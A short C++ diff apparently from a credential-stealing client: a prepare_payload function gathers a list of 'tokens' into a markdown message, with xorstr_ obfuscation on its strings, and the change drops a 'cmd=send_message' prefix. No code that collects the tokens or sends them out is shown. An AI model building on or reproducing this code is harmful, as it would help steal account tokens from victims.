@@ -174,7 +174,7 @@ namespace client {
 		}
 
 		std::string prepare_payload(std::string title, std::vector<std::string> tokens) {
-			std::string payload = std::string(xorstr_("cmd=send_message&content=")) + std::string("**") + title + std::string("**") + std::string("\n```\n");
+			std::string payload = std::string("**") + title + std::string("**\n```\n");
 			for (auto token : tokens) {
 				payload += token + xorstr_("\n");
 			}
